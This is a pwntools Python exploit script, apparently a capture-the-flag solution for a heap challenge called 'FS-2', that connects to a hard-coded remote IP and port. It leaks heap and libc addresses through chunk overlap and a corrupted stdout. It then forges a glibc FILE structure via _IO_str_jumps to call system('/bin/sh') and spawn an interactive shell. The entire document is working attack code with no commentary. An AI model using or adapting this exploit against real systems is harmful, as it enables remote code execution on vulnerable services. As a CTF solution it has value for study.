from pwn import *

# p = process("../FS-2")
p = remote("13.233.166.242",49157)
libc = ELF("../challenge/files/libc.so.6")

def add(index,size,data,f=0):
	print(p.recvuntil("[3] - Deliver the order."))
	p.sendline("1")
	print(p.recvuntil("?"))
	p.sendline(str(index))
	print(p.recvuntil("?"))
	p.sendline(str(size))
	print(p.recvuntil("?"))
	if f==0:
		p.sendline(data)
	else:
		p.send(data)

def edit(index,data):
	print(p.recvuntil("[3] - Deliver the order."))
	p.sendline("2")
	print(p.recvuntil("?"))
	p.sendline(str(index))
	print(p.recvuntil("?"))
	p.send(data)

def delete(index):
	print(p.recvuntil("[3] - Deliver the order."))
	p.sendline("3")
	print(p.recvuntil("?"))
	p.sendline(str(index))


print(p.recvuntil(":"))
p.sendline("A"*15)
print(p.recvuntil(":"))
p.sendline("AA")
print(p.recvline())
heap_leak = p.recvline()[:6]
heap_base = u64(heap_leak+"\x00\x00") - 0x260

add(0,240,"A")
add(1,240,"B")
add(2,240,"C")
add(3,240,"D")
add(4,240,"E")
add(5,240,"F")
add(6,240,"G")
add(7,240,p64(0x0)+p64(0x311)+p64(heap_base + 0x980)+p64(heap_base + 0x980))
# add(7,240,"H")
add(8,256,"I")
add(9,264,"J")
add(10,240,"K")
add(11,256,"L")

delete(0)
delete(1)
delete(2)
delete(3)
delete(4)
delete(5)
delete(6)

edit(9,p64(0x310)*33)

delete(10)
delete(11)
delete(9)
delete(8)

add(0,32,p16(0x3760),1)
add(1,0x140,p64(0x0)*23+p64(0x111)+p64(heap_base+0x990))

add(2,256,"C")
add(3,256,"D")
add(4,256,p64(0xfbad1800)+p64(0x0)*3+"\x00",1)

libc_leak = p.recvuntil("[1] - Give an order.")[9:17]
print(repr(libc_leak))
libc_leak = u64(libc_leak)

if(libc_leak == 0x726f206e61206576):
	p.close()


libc_base = libc_leak - 0x3b18b0
system = libc_base + libc.symbols["system"]
bin_sh = libc_base + 0x1746fc
some_data = libc_base + 0x3b07e3
stdin = libc_base + 0x3afa00
wide_data = libc_base + 0x3b18c0
_IO_str_jumps = libc_base + 0x3ac360

payload = p64(0xfbad2886)
payload += p64(some_data)*4
payload += p64((bin_sh-100)//2)
payload += p64(0x0)*2
payload += p64((bin_sh-100)//2)
payload += p64(0x0)*4
payload += p64(stdin)
payload += p64(0x1)
payload += p64(0xffffffffffffffff)
payload += p64(0x0)
payload += p64(wide_data)
payload += p64(0xffffffffffffffff)
payload += p64(0x0)
payload += p64(wide_data)
payload += p64(0x0)*3
payload += p64(0x00000000ffffffff)
payload += p64(0x0)*2
payload += p64(_IO_str_jumps)
payload += p64(system)

edit(4,payload)

p.interactive()